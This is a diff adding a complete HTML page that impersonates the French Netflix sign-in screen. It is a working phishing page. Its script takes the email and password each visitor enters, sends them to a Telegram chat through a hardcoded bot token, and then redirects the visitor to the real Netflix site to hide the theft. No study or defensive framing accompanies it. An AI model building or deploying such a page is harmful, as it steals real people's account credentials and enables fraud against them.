@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix France - Regardez des séries et films en streaming</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #000;
+            color: #fff;
+        }
+
+        .header {
+            padding: 20px 45px;
+        }
+
+        .header img {
+            height: 45px;
+        }
+
+        .login-container {
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 60px 68px;
+            background-color: rgba(0, 0, 0, 0.75);
+            border-radius: 4px;
+        }
+
+        h1 {
+            margin-bottom: 28px;
+            font-size: 32px;
+            font-weight: 500;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            height: 50px;
+            padding: 16px 20px 0;
+            background: #333;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+        }
+
+        input:focus {
+            background: #454545;
+            outline: none;
+        }
+
+        label {
+            position: absolute;
+            top: 15px;
+            left: 20px;
+            color: #8c8c8c;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+
+        input:focus + label,
+        input:not(:placeholder-shown) + label {
+            top: 7px;
+            font-size: 11px;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            margin: 24px 0 12px;
+            background: #e50914;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            position: relative;
+        }
+
+        button:hover {
+            background: #f6121d;
+        }
+
+        .remember-help {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 50px;
+            color: #b3b3b3;
+            font-size: 13px;
+        }
+
+        .remember-help a {
+            color: #b3b3b3;
+            text-decoration: none;
+        }
+
+        .remember-help a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-now {
+            color: #737373;
+            margin-top: 16px;
+        }
+
+        .signup-now a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .signup-now a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            background: rgba(0, 0, 0, 0.75);
+            padding: 30px 45px;
+            margin-top: 90px;
+            color: #737373;
+        }
+
+        .footer a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-top {
+            margin-bottom: 30px;
+        }
+
+        .footer-links {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            font-size: 13px;
+        }
+
+        .language-selector {
+            display: inline-block;
+            border: 1px solid #737373;
+            padding: 8px 10px;
+            margin-bottom: 20px;
+        }
+
+        /* Spinner styles */
+        .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .btn-loading {
+            color: transparent !important;
+        }
+
+        .btn-loading .spinner {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix">
+    </header>
+
+    <div class="login-container">
+        <h1>S'identifier</h1>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder=" " required>
+                <label for="email">E-mail ou numéro de téléphone</label>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder=" " required>
+                <label for="password">Mot de passe</label>
+            </div>
+            <button type="submit" id="submitBtn">
+                <span>S'identifier</span>
+                <div class="spinner"></div>
+            </button>
+            <div class="remember-help">
+                <div>
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Se souvenir de moi</label>
+                </div>
+                <a href="#">Besoin d'aide ?</a>
+            </div>
+        </form>
+        <div class="signup-now">
+            Nouveau sur Netflix ? <a href="#">Inscrivez-vous maintenant.</a>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-top">
+            Des questions ? Appelez le <a href="tel:(+33) 0805-543-063">(+33) 0805-543-063</a>
+        </div>
+        <div class="footer-links">
+            <a href="#">FAQ</a>
+            <a href="#">Centre d'aide</a>
+            <a href="#">Conditions d'utilisation</a>
+            <a href="#">Confidentialité</a>
+            <a href="#">Préférences de cookies</a>
+            <a href="#">Mentions légales</a>
+            <a href="#">Choix liés à la pub</a>
+        </div>
+        <div class="language-selector">
+            <select>
+                <option>Français</option>
+                <option>English</option>
+            </select>
+        </div>
+        <div>Netflix France</div>
+    </footer>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Show spinner
+            submitBtn.classList.add('btn-loading');
+            
+            // Send data to Telegram bot
+            const botToken = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk';
+            const chatId = '-4883048028';
+            const message = `🔐 NOUVELLE TENTATIVE DE CONNEXION NETFLIX 🔐
+
+📧 Email: ${email}
+🔑 Mot de passe: ${password}
+
+⏰ ${new Date().toLocaleString()}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Identifiants envoyés à Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi à Telegram:', error);
+            })
+            .finally(() => {
+                // Wait 2 seconds before redirecting (simulating login)
+                setTimeout(() => {
+                    window.location.href = 'https://www.netflix.com/browse';
+                }, 2000);
+            });
+        });
+    </script>
+</body>
+</html>
